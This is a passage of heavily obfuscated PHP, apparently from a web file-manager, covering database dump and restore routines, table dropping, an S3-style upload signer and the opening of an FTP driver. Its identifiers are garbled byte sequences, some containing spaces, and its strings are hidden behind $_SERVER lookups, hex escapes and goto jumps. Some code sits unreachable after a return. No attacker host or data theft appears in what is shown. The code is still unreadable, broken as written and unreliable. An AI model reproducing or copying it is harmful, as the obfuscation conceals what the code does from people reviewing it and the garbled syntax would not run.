array($Ã‡½½”õ) : $Ø³¡€Ö->getTables(); foreach ($ÛıÙƒ„« as $¦èç åˆ) { $Ã‡½½”õ = basename($¦èç åˆ, $ìÆÈÈŒ[875]); if (!in_array($Ã‡½½”õ, $ØÚş§›³)) { continue; } $ËÛ­˜Ï©->task[$ìÆÈÈŒ[1153]] = $Ã‡½½”õ; if (get_filesize($¦èç åˆ) == 0) { continue; } $¯Õ–ûÑâ = $this->sqlToDb($¦èç åˆ, $ËÛ­˜Ï©); if (!$¯Õ–ûÑâ) { ActionCall($ìÆÈÈŒ[1148], !0, 0); show_json(LNG($ìÆÈÈŒ[1154]) . "\133{$Ã‡½½”õ}\135", !1); } } } public function sqlFromDb($ş‰…µ—Í, $Õü§Ùìä, &$»ëı’ßá, $ù£ëÎ¤ = '') { if ($»ëı’ßá) { $»ëı’ßá->task[$_SERVER[§Êá¸İ][1153]] = $ş‰…µ—Í; } $ÆË¾î²• = $this->model($ş‰…µ—Í); $’õ¸¼à— = 0; $Œ¼ÖÒ Ô = 0; $ ¸şºÔû = 10000; $ß»òÕ³Ó = fopen($Õü§Ùìä, $_SERVER[§Êá¸İ][1155]); $€¨Óšå¨ = $ÆË¾î²•->getPk(); $ÈÊéê€ = $ÆË¾î²•->getDbFields(); $Ì™â†ê = $_SERVER[§Êá¸İ][12]; if ($GLOBALS[$_SERVER[§Êá¸İ][874]] && in_array($ş‰…µ—Í, array($_SERVER[§Êá¸İ][1156], $_SERVER[§Êá¸İ][1157]))) { $Ì™â†ê = $ş‰…µ—Í; } do { $Â„šØ¢§ = array($€¨Óšå¨ => array($_SERVER[§Êá¸İ][1102], $Œ¼ÖÒ Ô)); $òß¡ßö = $ÆË¾î²•->where($Â„šØ¢§)->field($ÈÊéê€)->order($€¨Óšå¨ . $_SERVER[§Êá¸İ][1158])->limit($ ¸şºÔû)->select(); $òß¡ßö = !empty($òß¡ßö) ? $òß¡ßö : array(); if (!($Šı–Ä = count($òß¡ßö))) { break; } $¼‰Ñ¨˜ = end($òß¡ßö); $Œ¼ÖÒ Ô = $¼‰Ñ¨˜[$€¨Óšå¨]; $“˜ÚÅ®Ñ = array(); foreach ($òß¡ßö as $—¨¿ŒÃĞ) { if ($Ì™â†ê) { if ($ş‰…µ—Í == $_SERVER[§Êá¸İ][1156]) { if ($—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][33]] == $_SERVER[§Êá¸İ][1159]) { $Šº³Æ† = json_decode($—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][450]], !0); if ($Šº³Æ†[$_SERVER[§Êá¸İ][32]] == $GLOBALS[$_SERVER[§Êá¸İ][874]] && $Šº³Æ†[$_SERVER[§Êá¸İ][837]] != 1) { continue; } } } else { if ($—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][33]] == $_SERVER[§Êá¸İ][1160] && $—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][97]] == $_SERVER[§Êá¸İ][869]) { continue; } } } if ($ù£ëÎ¤) { $—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][87]] = "\173\x69\157\72{$ù£ëÎ¤}\175" . substr($—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][87]], strlen("\173\x69\157\72{$—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][904]]}\x7d")); $—¨¿ŒÃĞ[$_SERVER[§Êá¸İ][904]] = $ù£ëÎ¤; } $“˜ÚÅ®Ñ[] = $_SERVER[§Êá¸İ][1161] . $this->sqlEncode($—¨¿ŒÃĞ) . $_SERVER[§Êá¸İ][1162]; } $œ¿¾ñ×— = "\111\116\x53\105\122\x54\x20\x49\116\x54\x4f\x20\x60{$ş‰…µ—Í}\140\x20\x28\140" . implode($_SERVER[§Êá¸İ][1163], $ÈÊéê€) . $_SERVER[§Êá¸İ][1164]; fwrite($ß»òÕ³Ó, $œ¿¾ñ×— . implode($_SERVER[§Êá¸İ][1165], $“˜ÚÅ®Ñ) . $_SERVER[§Êá¸İ][74] . PHP_EOL); $’õ¸¼à— += $Šı–Ä; if ($»ëı’ßá) { $»ëı’ßá->update($Šı–Ä); } } while ($ ¸şºÔû == $Šı–Ä); fclose($ß»òÕ³Ó); return $’õ¸¼à—; } public function sqlToDb($™èÄÜîİ, &$•»Ä„Ÿ¹) { $°³º•»Ï =& $_SERVER[§Êá¸İ]; $¸¶×Š“ı = $this->model()->db(); $ŒÏ™ËÅ² = @fopen($™èÄÜîİ, $°³º•»Ï[1166]); if (!$ŒÏ™ËÅ²) { return !1; } $—®ÄßÂ– = 0; $±ı¿‡ùë = $°³º•»Ï[12]; $ı­—ƒ = array(); $û£õûƒ = $this->dbType(); $†¤©˜Œ¬ = $û£õûƒ == $°³º•»Ï[13] ? 500 : 2000; $æ˜¨»İİ = basename($™èÄÜîİ, $°³º•»Ï[875]); $»ºÙö…… = 0; $…èÍ¾ÕÈ = 4194304; while (!feof($ŒÏ™ËÅ²)) { $¯ñæ¹ıé = trim(fgets($ŒÏ™ËÅ²)); if (!$¯ñæ¹ıé) { continue; } $úÍËÙÏì = $this->sqlDecode($¯ñæ¹ıé, $û£õûƒ, $æ˜¨»İİ); if (stripos($úÍËÙÏì, $°³º•»Ï[431]) === 0) { if (!$±ı¿‡ùë) { $±ı¿‡ùë = $úÍËÙÏì . $°³º•»Ï[53]; } continue; } if ($•»Ä„Ÿ¹) { $•»Ä„Ÿ¹->task[$°³º•»Ï[1151]] += 1; } $—®ÄßÂ–++; $ı­—ƒ[] = rtrim(rtrim(trim($úÍËÙÏì), $°³º•»Ï[50]), $°³º•»Ï[74]); $ú“Ç­ = null; $ü±„ÕÚû = strlen($úÍËÙÏì); $»ºÙö…… += $ü±„ÕÚû; $ÕèÖşè = strlen($±ı¿‡ùë) + $»ºÙö…… + (count($ı­—ƒ) - 1); if ($ÕèÖşè >= $…èÍ¾ÕÈ) { $ú“Ç­ = array_pop($ı­—ƒ); if ($—®ÄßÂ– > 1) { $—®ÄßÂ–--; } } if ($—®ÄßÂ– >= $†¤©˜Œ¬ || $ú“Ç­) { $úÍËÙÏì = $±ı¿‡ùë . implode($°³º•»Ï[50], $ı­—ƒ); if (!$¸¶×Š“ı->execute($úÍËÙÏì)) { return !1; } if ($•»Ä„Ÿ¹) { $•»Ä„Ÿ¹->update($—®ÄßÂ–); } $ı­—ƒ = array(); $—®ÄßÂ– = 0; $»ºÙö…… = 0; if ($ú“Ç­) { $ı­—ƒ = array($ú“Ç­); $—®ÄßÂ– = 1; $»ºÙö…… = $ü±„ÕÚû; } } } fclose($ŒÏ™ËÅ²); if (!empty($ı­—ƒ)) { $úÍËÙÏì = $±ı¿‡ùë . implode($°³º•»Ï[50], $ı­—ƒ); if (!$¸¶×Š“ı->execute($úÍËÙÏì)) { return !1; } if ($•»Ä„Ÿ¹) { $•»Ä„Ÿ¹->update($—®ÄßÂ–); } } return !0; } public function dropTable($Ç©ôíº = null) { $ÀÉãéÍÏ = $this->model()->db(); $úñÆŒ×Ó = $Ç©ôíº ? array($Ç©ôíº) : $ÀÉãéÍÏ->getTables(); if (!$úñÆŒ×Ó) { return; } foreach ($úñÆŒ×Ó as $Ç©ôíº) { if ($Ç©ôíº) { $Ç©ôíº = strtolower($Ç©ôíº); } else { continue; } $ÀÉãéÍÏ->execute("\144\162\157\x70\x20\x74\141\142\x6c\145\x20\151\146\40\145\x78\151\x73\x74\x73\x20\x60{$Ç©ôíº}\140"); } } private function sqlEncode($•’­Œ®ü) { $ÎòÅòœÑ =& $_SERVER[§Êá¸İ]; $Í•ùşÙĞ = array(); foreach ($•’­Œ®ü as $¬Ö»Íµ±) { if (is_array($¬Ö»Íµ±)) { $¬Ö»Íµ± = json_encode_force($¬Ö»Íµ±); } $¬Ö»Íµ± = addslashes($¬Ö»Íµ±); $¬Ö»Íµ± = str_replace(array($ÎòÅòœÑ[1167], $ÎòÅòœÑ[262], $ÎòÅòœÑ[418]), array($ÎòÅòœÑ[1168], $ÎòÅòœÑ[1169], $ÎòÅòœÑ[1170]), $¬Ö»Íµ±); $Í•ùşÙĞ[] = $¬Ö»Íµ±; } return $ÎòÅòœÑ[58] . implode($ÎòÅòœÑ[1171], $Í•ùşÙĞ) . $ÎòÅòœÑ[58]; } private function sqlDecode($ò³æ¾ƒ, $¥íÛŠ¤¬, $»˜ü—Â = '') { $˜Ê¿¥ö´ =& $_SERVER[§Êá¸İ]; $ò³æ¾ƒ = str_replace(array($˜Ê¿¥ö´[1168], $˜Ê¿¥ö´[1169], $˜Ê¿¥ö´[1170]), array($˜Ê¿¥ö´[1167], $˜Ê¿¥ö´[262], $˜Ê¿¥ö´[418]), $ò³æ¾ƒ); if ($¥íÛŠ¤¬ == $˜Ê¿¥ö´[13]) { $ò³æ¾ƒ = str_ireplace($˜Ê¿¥ö´[1172], $˜Ê¿¥ö´[59], $ò³æ¾ƒ); $ò³æ¾ƒ = stripslashes($ò³æ¾ƒ); } return preg_replace($˜Ê¿¥ö´[1173], $˜Ê¿¥ö´[12], $ò³æ¾ƒ); if ($¥íÛŠ¤¬ == $˜Ê¿¥ö´[13]) { return $»˜ü—Â != $˜Ê¿¥ö´[1174] ? stripslashes($ò³æ¾ƒ) : $ò³æ¾ƒ; } if ($»˜ü—Â == $˜Ê¿¥ö´[1174]) { $ò³æ¾ƒ = str_replace($˜Ê¿¥ö´[1175], $˜Ê¿¥ö´[121], stripslashes($ò³æ¾ƒ)); } return $ò³æ¾ƒ; } public function getSqlFile($ı£ŸËÆù = '') { $÷š±¥æ =& $_SERVER[§Êá¸İ]; $“ÙÏ¯± = $this->dbType(!0); $Ä×ô™‘¤ = CONTROLLER_DIR . "\151\156\x73\x74\x61\x6c\154\x2f\x64\x61\164\x61\x2f{$“ÙÏ¯±}\x2e\x73\x71\154"; $˜—ÂˆÓ¦ = file_get_contents($Ä×ô™‘¤); $¹´ÓÌî = $÷š±¥æ[1176] . ($“ÙÏ¯± == $÷š±¥æ[891] ? $÷š±¥æ[1177] : $÷š±¥æ[1178]) . $÷š±¥æ[1179]; preg_match_all($¹´ÓÌî, $˜—ÂˆÓ¦, $™êºÉÖÁ); $‡Şøûìİ = $™êºÉÖÁ[1]; $‘ó‰ÉîÛ = $this->model()->db(); $÷ú¼À = $‘ó‰ÉîÛ->getTables(); $´‹Ú²™ú = TEMP_FILES . $÷š±¥æ[1180] . date($÷š±¥æ[272]) . $÷š±¥æ[8]; del_dir($´‹Ú²™ú); mk_dir($´‹Ú²™ú); $úÔ›¬Ú = $´‹Ú²™ú . $÷š±¥æ[1181]; $³™œ÷šŸ = $´‹Ú²™ú . $÷š±¥æ[1182]; $€œÓ¥ı = $“ÙÏ¯± == $÷š±¥æ[13] ? $÷š±¥æ[891] : $÷š±¥æ[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\154\57\x64\x61\x74\x61\x2f{$€œÓ¥ı}\x2e\x73\161\x6c", $´‹Ú²™ú); @touch($´‹Ú²™ú . $“ÙÏ¯± . $÷š±¥æ[875]); $¼’ª¨—é = fopen($úÔ›¬Ú, $÷š±¥æ[1155]); $¢¹È›Îª = fopen($³™œ÷šŸ, $÷š±¥æ[1155]); if ($“ÙÏ¯± == $÷š±¥æ[13]) { $÷ú¼À = array_diff($÷ú¼À, array($÷š±¥æ[867], $÷š±¥æ[868])); $çµëŠ¶ = array($÷š±¥æ[1183], $÷š±¥æ[1184], $÷š±¥æ[1185]); fwrite($¢¹È›Îª, implode(PHP_EOL, $çµëŠ¶) . PHP_EOL . PHP_EOL); foreach ($÷ú¼À as $ÒÅ¯ùæ) { $Ì£ş’à² = $this->sqlFromSqlite($ÒÅ¯ùæ); if (!$Ì£ş’à²[$÷š±¥æ[13]]) { continue; } fwrite($¢¹È›Îª, $Ì£ş’à²[$÷š±¥æ[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÒÅ¯ùæ, $‡Şøûìİ)) { fwrite($¼’ª¨—é, $Ì£ş’à²[$÷š±¥æ[891]] . PHP_EOL . PHP_EOL); } } } else { foreach ($÷ú¼À as $ÒÅ¯ùæ) { $Ì£ş’à² = $this->sqlFromMysql($ÒÅ¯ùæ); if (!$Ì£ş’à²[$÷š±¥æ[891]]) { continue; } fwrite($¼’ª¨—é, $Ì£ş’à²[$÷š±¥æ[891]] . PHP_EOL . PHP_EOL); if (!in_array($ÒÅ¯ùæ, $‡Şøûìİ)) { fwrite($¢¹È›Îª, $Ì£ş’à²[$÷š±¥æ[13]] . PHP_EOL . PHP_EOL); } } } fclose($¼’ª¨—é); fclose($¢¹È›Îª); $˜—ÂˆÓ¦ = array($÷š±¥æ[891] => $úÔ›¬Ú, $÷š±¥æ[13] => $³™œ÷šŸ); return $ı£ŸËÆù ? $˜—ÂˆÓ¦[$ı£ŸËÆù] : $˜—ÂˆÓ¦; } public function dbType($¡Ô³ß¾Œ = false) { $íÆåü´ =& $_SERVER[§Êá¸İ]; $’¶¥òŞ‚ = $¡Ô³ß¾Œ ? $GLOBALS[$íÆåü´[6]][$íÆåü´[21]] : $this->database; $’¶¥òŞ‚ = array_change_key_case($’¶¥òŞ‚); $ê­™á© = $’¶¥òŞ‚[$íÆåü´[1055]]; if ($ê­™á© == $íÆåü´[1052]) { $˜ùÆ½à = explode($íÆåü´[4], $’¶¥òŞ‚[$íÆåü´[1061]]); $ê­™á© = $˜ùÆ½à[0]; } $Ó²‚™ = array($íÆåü´[1186] => $íÆåü´[13], $íÆåü´[999] => $íÆåü´[891]); if (isset($Ó²‚™[$ê­™á©])) { $ê­™á© = $Ó²‚™[$ê­™á©]; } return $ê­™á©; } public function sqlFromMysql($ÌÚ®Ÿã, $Ò¢¼ëãÈ = '') { $äì²—… =& $_SERVER[§Êá¸İ]; $˜ùµˆ·Ú = $this->model()->db(); $¢­äè¸ = $˜ùµˆ·Ú->query($äì²—…[1187] . $ÌÚ®Ÿã . $äì²—…[461]); if (!$¢­äè¸ || !$¢­äè¸[0]) { return !1; } $ö¢ŠÕı¢ = _get($¢­äè¸[0], $äì²—…[1188], $äì²—…[12]); if (!$ö¢ŠÕı¢) { return !1; } $ãäÉ¯ÎÂ = "\x44\122\117\120\40\124\x41\x42\114\105\x20\x49\106\40\x45\x58\111\x53\x54\123\40\140{$ÌÚ®Ÿã}\x60\x3b" . PHP_EOL . $ö¢ŠÕı¢ . $äì²—…[74]; if ($Ò¢¼ëãÈ && $Ò¢¼ëãÈ == $äì²—…[891]) { return $ãäÉ¯ÎÂ; } $õ¯ß–œ• = array_change_key_case($GLOBALS[$äì²—…[6]][$äì²—…[21]]); $ôĞÈ±µ• = $õ¯ß–œ•[$äì²—…[1060]]; $‡ûˆ”Œ = $äì²—…[1189] . $ôĞÈ±µ• . $äì²—…[1190] . $ÌÚ®Ÿã . $äì²—…[58]; $ĞÈ÷½ˆ  = $äì²—…[1191] . $ÌÚ®Ÿã . $äì²—…[987]; $‘Í»…“à = $˜ùµˆ·Ú->query($‡ûˆ”Œ); if (empty($‘Í»…“à)) { $æ‚±Á„ò = array($äì²—…[891] => $äì²—…[12], $äì²—…[13] => $äì²—…[12]); return $Ò¢¼ëãÈ ? $æ‚±Á„ò[$Ò¢¼ëãÈ] : $æ‚±Á„ò; } $Á¶şÒó¹ = $˜ùµˆ·Ú->query($ĞÈ÷½ˆ ); $àÜõÚÇ = $äì²—…[12]; $ƒäÁ…ˆ = array(); foreach ($Á¶şÒó¹ as $ÓÍÒµáÎ) { if (!$àÜõÚÇ && $ÓÍÒµáÎ[$äì²—…[1192]] == $äì²—…[1193]) { $àÜõÚÇ = $ÓÍÒµáÎ[$äì²—…[1194]]; } if (isset($ƒäÁ…ˆ[$ÓÍÒµáÎ[$äì²—…[1192]]])) { $ƒäÁ…ˆ[$ÓÍÒµáÎ[$äì²—…[1192]]][$äì²—…[1195]][] = $ÓÍÒµáÎ[$äì²—…[1194]]; continue; } $ƒäÁ…ˆ[$ÓÍÒµáÎ[$äì²—…[1192]]] = array($äì²—…[1196] => $ÓÍÒµáÎ[$äì²—…[1192]], $äì²—…[1195] => array($ÓÍÒµáÎ[$äì²—…[1194]]), $äì²—…[1197] => $ÓÍÒµáÎ[$äì²—…[1198]] == $äì²—…[91] ? 0 : 1); } $§ê×Şü = array(); foreach ($ƒäÁ…ˆ as $ÓÍÒµáÎ) { $»¨¥ˆ = $ÓÍÒµáÎ[$äì²—…[1196]] == $äì²—…[1193]; $‰—Ëç”à = array($äì²—…[1199], $ÓÍÒµáÎ[$äì²—…[1197]] == $äì²—…[91] && !$»¨¥ˆ ? $äì²—…[1200] : $äì²—…[12], $äì²—…[1201], $äì²—…[1202] . $ÌÚ®Ÿã . $äì²—…[11] . ($»¨¥ˆ ? $äì²—…[1203] : $ÓÍÒµáÎ[$äì²—…[1196]]) . $äì²—…[121], $äì²—…[1204], $äì²—…[121] . $ÌÚ®Ÿã . $äì²—…[121], $äì²—…[1205] . implode($äì²—…[1206], $ÓÍÒµáÎ[$äì²—…[1195]]) . $äì²—…[1207]); $§ê×Şü[] = implode($äì²—…[53], $‰—Ëç”à) . $äì²—…[74]; } $óñàÔàñ = array(); $úî¡–ŞÌ = array($äì²—…[1208] => $äì²—…[1209], $äì²—…[1209] => $äì²—…[1209], $äì²—…[364] => $äì²—…[391], $äì²—…[363] => $äì²—…[391]); foreach ($‘Í»…“à as $ÓÍÒµáÎ) { $‰—Ëç”à = array($äì²—…[121] . $ÓÍÒµáÎ[$äì²—…[1210]] . $äì²—…[121], isset($úî¡–ŞÌ[$ÓÍÒµáÎ[$äì²—…[1211]]]) ? $úî¡–ŞÌ[$ÓÍÒµáÎ[$äì²—…[1211]]] : $ÓÍÒµáÎ[$äì²—…[1212]], $ÓÍÒµáÎ[$äì²—…[1213]] == $äì²—…[985] ? $äì²—…[1214] : $äì²—…[1215], $ÓÍÒµáÎ[$äì²—…[1210]] == $àÜõÚÇ ? $äì²—…[1216] : $äì²—…[12], $ÓÍÒµáÎ[$äì²—…[1037]] ? strtoupper(str_replace($äì²—…[11], $äì²—…[12], $ÓÍÒµáÎ[$äì²—…[1037]])) : $äì²—…[12]); $óñàÔàñ[] = trim(implode($äì²—…[53], $‰—Ëç”à)); } $ºÖ£å·ù = array($äì²—…[1217] . $ÌÚ®Ÿã . $äì²—…[1218], $äì²—…[1219] . $ÌÚ®Ÿã . $äì²—…[1220], implode($äì²—…[50] . PHP_EOL, $óñàÔàñ), $äì²—…[1034]); $Ê‘š°ğÈ = implode(PHP_EOL, array_merge($ºÖ£å·ù, $§ê×Şü)); if ($Ò¢¼ëãÈ && $Ò¢¼ëãÈ == $äì²—…[13]) { return $Ê‘š°ğÈ; } $æ‚±Á„ò = array($äì²—…[891] => $ãäÉ¯ÎÂ, $äì²—…[13] => $Ê‘š°ğÈ); return $Ò¢¼ëãÈ ? $æ‚±Á„ò[$Ò¢¼ëãÈ] : $æ‚±Á„ò; } public function sqlFromSqlite($»Š£ß•ô, $ÇæóšÖÍ = '') { $æêë¾ş =& $_SERVER[§Êá¸İ]; $Ÿê÷²ú£ = $this->model()->db(); $°Üöñ£ã = "\x50\x52\101\107\x4d\101\x20\124\101\102\114\105\x5f\x49\116\106\x4f\40\50\47{$»Š£ß•ô}\47\x29"; $†Ğãƒ…Æ = "\x53\105\114\x45\x43\124\x20\52\x20\x46\x52\117\115\x20\x73\161\x6c\151\164\x65\137\155\x61\163\164\x65\162\40\x57\x48\x45\122\x45\40\164\x62\x6c\137\156\141\x6d\x65\40\75\x20\47{$»Š£ß•ô}\x27"; $¼­ÛÃÊ = $Ÿê÷²ú£->query($°Üöñ£ã); if (empty($¼­ÛÃÊ)) { $Óù¾©¹Ş = array($æêë¾ş[891] => $æêë¾ş[12], $æêë¾ş[13] => $æêë¾ş[12]); return $ÇæóšÖÍ ? $Óù¾©¹Ş[$ÇæóšÖÍ] : $Óù¾©¹Ş; } $ÛÍ¯úê­ = $Ÿê÷²ú£->query($†Ğãƒ…Æ); $Üª‰Ğ˜× = $â¥îİÑ = array(); foreach ($ÛÍ¯úê­ as $ùç€øê) { if ($ùç€øê[$æêë¾ş[33]] == $æêë¾ş[356]) { $Üª‰Ğ˜×[] = $ùç€øê[$æêë¾ş[1221]]; } else { $â¥îİÑ[$ùç€øê[$æêë¾ş[32]]] = $ùç€øê[$æêë¾ş[1221]]; } } $œøÙàË­ = array_merge(array($æêë¾ş[1217] . $»Š£ß•ô . $æêë¾ş[121]), $Üª‰Ğ˜×, array_values($â¥îİÑ)); $œøÙàË­ = implode($æêë¾ş[74] . PHP_EOL, $œøÙàË­) . $æêë¾ş[74]; if ($ÇæóšÖÍ && $ÇæóšÖÍ == $æêë¾ş[13]) { return $œøÙàË­; } $êúñ³ü = array(); $·ëö×œ• = array($æêë¾ş[1209] => $æêë¾ş[1222], $æêë¾ş[391] => $æêë¾ş[1223]); $‡Èıì = $æêë¾ş[12]; foreach ($¼­ÛÃÊ as $ùç€øê) { if ($ùç€øê[$æêë¾ş[57]] == $æêë¾ş[91]) { $‡Èıì = $ùç€øê[$æêë¾ş[32]]; } $‘Ğá¶›Á = array($æêë¾ş[461] . $ùç€øê[$æêë¾ş[32]] . $æêë¾ş[461], isset($·ëö×œ•[$ùç€øê[$æêë¾ş[33]]]) ? $·ëö×œ•[$ùç€øê[$æêë¾ş[33]]] : $ùç€øê[$æêë¾ş[33]], $ùç€øê[$æêë¾ş[35]] == $æêë¾ş[91] ? $æêë¾ş[1214] : $æêë¾ş[1224] . $ùç€øê[$æêë¾ş[56]], $ùç€øê[$æêë¾ş[57]] == $æêë¾ş[91] ? $æêë¾ş[1225] : $æêë¾ş[12]); $êúñ³ü[] = trim(implode($æêë¾ş[53], $‘Ğá¶›Á)); } foreach ($â¥îİÑ as $‡åŸÙÏ´ => $·¶‰¥öã) { $‘½¿¶ã» = str_replace($æêë¾ş[1226] . $»Š£ß•ô . $æêë¾ş[11], $æêë¾ş[12], $‡åŸÙÏ´); $‘¸šö• = str_replace(array($æêë¾ş[121], $æêë¾ş[1045]), $æêë¾ş[461], substr($·¶‰¥öã, stripos($·¶‰¥öã, $æêë¾ş[337]))); if ($‘½¿¶ã» == $æêë¾ş[1203]) { $ÚË±öƒß = $æêë¾ş[1227] . $‡Èıì . $æêë¾ş[1228]; } else { $ÚË±öƒß = (stripos($‘½¿¶ã», $æêë¾ş[11]) ? $æêë¾ş[1229] : $æêë¾ş[12]) . ($æêë¾ş[1230] . $‘½¿¶ã» . $æêë¾ş[1231] . $‘¸šö•); } $êúñ³ü[] = $ÚË±öƒß; } $ƒì•ˆÜÙ = array($æêë¾ş[1232] . $»Š£ß•ô . $æêë¾ş[1233], $æêë¾ş[1234] . $»Š£ß•ô . $æêë¾ş[1235], implode($æêë¾ş[50] . PHP_EOL, $êúñ³ü), $æêë¾ş[1236]); $’áñËìÃ = implode(PHP_EOL, $ƒì•ˆÜÙ); if ($ÇæóšÖÍ && $ÇæóšÖÍ == $æêë¾ş[891]) { return $’áñËìÃ; } $Óù¾©¹Ş = array($æêë¾ş[891] => $’áñËìÃ, $æêë¾ş[13] => $œøÙàË­); return $ÇæóšÖÍ ? $Óù¾©¹Ş[$ÇæóšÖÍ] : $Óù¾©¹Ş; } } goto FŒŒÎŠ¢¥; f–¤Ó£¡ß: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($èœÙàÂ²) { parent::__construct($èœÙàÂ²); $this->setSignVersion($_SERVER[§Êá¸İ][247]); } public function uploadFormData($“¥ÍÕ„–, $™Ş÷é«¶ = 3600) { $ïÆÌ¤©‹ =& $_SERVER[§Êá¸İ]; $¼ì¹£ù¢ = $ïÆÌ¤©‹[229]; $„ç•¼Ä = $ïÆÌ¤©‹[270]; $„¨æÂÎ = $ïÆÌ¤©‹[62]; $•Ê°åÔ = gmdate($ïÆÌ¤©‹[271]); $¢€§¶²ƒ = gmdate($ïÆÌ¤©‹[272]); $øÅ³‡˜  = $ïÆÌ¤©‹[273]; $İò š = $™Ş÷é«¶ . $ïÆÌ¤©‹[12]; $“«—Å„“ = $ïÆÌ¤©‹[274]; $•ÓØ­ÅÖ = array($this->accessKey, $¢€§¶²ƒ, $this->region, $„¨æÂÎ, $øÅ³‡˜ ); $ƒ×ôåÛ– = implode($ïÆÌ¤©‹[8], $•ÓØ­ÅÖ); $Æ“íæçŞ = array($ïÆÌ¤©‹[275] => gmdate($ïÆÌ¤©‹[299], strtotime($ïÆÌ¤©‹[277])), $ïÆÌ¤©‹[278] => array(array($ïÆÌ¤©‹[279] => $this->bucket), array($ïÆÌ¤©‹[280] => $¼ì¹£ù¢), array($ïÆÌ¤©‹[281], $ïÆÌ¤©‹[282], $ïÆÌ¤©‹[12]), array($ïÆÌ¤©‹[281], $ïÆÌ¤©‹[283], $ïÆÌ¤©‹[12]), array($ïÆÌ¤©‹[281], $ïÆÌ¤©‹[284], $ïÆÌ¤©‹[12]), array($ïÆÌ¤©‹[285] => $“«—Å„“), array($ïÆÌ¤©‹[286] => $ƒ×ôåÛ–), array($ïÆÌ¤©‹[287] => $„ç•¼Ä), array($ïÆÌ¤©‹[288] => $•Ê°åÔ), array($ïÆÌ¤©‹[289] => $İò š))); $¯âÚô»á = base64_encode(json_encode($Æ“íæçŞ)); $„ñàÊÒØ = hash_hmac($ïÆÌ¤©‹[290], $¢€§¶²ƒ, $ïÆÌ¤©‹[291] . $this->secret, !0); $—Æ€¡¥Õ = hash_hmac($ïÆÌ¤©‹[290], $this->region, $„ñàÊÒØ, !0); $‚ù„’“ = hash_hmac($ïÆÌ¤©‹[290], $„¨æÂÎ, $—Æ€¡¥Õ, !0); $™·†£åÔ = hash_hmac($ïÆÌ¤©‹[290], $øÅ³‡˜ , $‚ù„’“, !0); $ö€òÆò = hash_hmac($ïÆÌ¤©‹[290], $¯âÚô»á, $™·†£åÔ); $ÎÆ–÷Â¡ = array($ïÆÌ¤©‹[246] => $ïÆÌ¤©‹[12], $ïÆÌ¤©‹[292] => $ïÆÌ¤©‹[12], $ïÆÌ¤©‹[280] => $¼ì¹£ù¢, $ïÆÌ¤©‹[285] => $“«—Å„“, $ïÆÌ¤©‹[293] => $¯âÚô»á, $ïÆÌ¤©‹[294] => $ƒ×ôåÛ–, $ïÆÌ¤©‹[295] => $„ç•¼Ä, $ïÆÌ¤©‹[296] => $•Ê°åÔ, $ïÆÌ¤©‹[297] => $İò š, $ïÆÌ¤©‹[298] => $ö€òÆò, $ïÆÌ¤©‹[208] => $this->getHost()); return $ÎÆ–÷Â¡; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ØùĞú¾á) { parent::__construct(); if (count($ØùĞú¾á) > 0) { $this->_init($ØùĞú¾á); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ä‰ãı’) { $ƒËµê¿ñ =& $_SERVER[§Êá¸İ]; global $config; $this->appCharset = $config[$ƒËµê¿ñ[1446]]; $this->systemCharset = $config[$ƒËµê¿ñ[1447]]; if (isset($Ä‰ãı’[$ƒËµê¿ñ[1448]]) && $Ä‰ãı’[$ƒËµê¿ñ[1448]]) { $this->systemCharset = $Ä‰ãı’[$ƒËµê¿ñ[1448]]; } } public function iconvApp($Ç€ÚÚúÇ) { return $this->iconvTo($Ç€ÚÚúÇ, $this->systemCharset, $this->appCharset); } public function iconvSystem($˜şø”Ñ‚) { return $this->iconvTo($˜şø”Ñ‚, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ôõ†¸ü) { $ù©ØÊ‚ß =& $_SERVER[§Êá¸İ]; $Ó«™Ö©Û = $this->iconvApp($this->pathBase); $Ôõ†¸ü = $this->iconvApp($Ôõ†¸ü); if (substr($Ó«™Ö©Û, 0, 2) == $ù©ØÊ‚ß[1420]) { $Ó«™Ö©Û = BASIC_PATH . substr($Ó«™Ö©Û, 2); } if (substr($Ôõ†¸ü, 0, 2) == $ù©ØÊ‚ß[1420]) { $Ôõ†¸ü = BASIC_PATH . substr($Ôõ†¸ü, 2); } $Ó«™Ö©Û = KodIO::clear($Ó«™Ö©Û); $Ôõ†¸ü = KodIO::clear($Ôõ†¸ü); $Ôõ†¸ü = substr($Ôõ†¸ü, strlen($Ó«™Ö©Û)); if (empty($this->pathDriver)) { return $Ôõ†¸ü; } return $this->pathDriver . $ù©ØÊ‚ß[8] . ltrim($Ôõ†¸ü, $ù©ØÊ‚ß[8]); } private function _init($òÓõ¸ì = array()) { $Ô°ô¸€ï =& $_SERVER[§Êá¸İ]; if (!function_exists($Ô°ô¸€ï[1449])) { throw new Exception(LNG($Ô°ô¸€ï[1450])); } $this->config = $òÓõ¸ì; $this->charsetReset($òÓõ¸ì); foreach ($òÓõ¸ì as $ÓÌó›ú‰ => $Äš…ğÆ’) { if (isset($this->{$ÓÌó›ú‰})) { $this->{$ÓÌó›ú‰} = $Äš…ğÆ’; } } return $this->_login($òÓõ¸ì); } private function _login($Ú¸¤µò) { $šÜõÀ Í =& $_SERVER[§Êá¸İ]; static $¨šãº = array(); $ÓØÓ“·Ó = md5(json_encode($Ú¸¤µò)); if (isset($¨šãº[$ÓØÓ“·Ó])) { foreach ($¨šãº[$ÓØÓ“·Ó] as $é­É– => $È®Á÷‰) { $this->{$é­É–} = $È®Á÷‰; } return !0; } $ş…û«ğ÷ = parse_url(trim($this->server, $šÜõÀ Í[8])); $this->host = $ş…û«ğ÷[$šÜõÀ Í[208]]; $ú®ŞŸœ° = isset($ş…û«ğ÷[$šÜõÀ Í[207]]) && $ş…û«ğ÷[$šÜõÀ Í[207]] == $šÜõÀ Í[1451] ? !0 : !1; $this->scheme = $ú®ŞŸœ° ? $šÜõÀ Í[1452] : $šÜõÀ 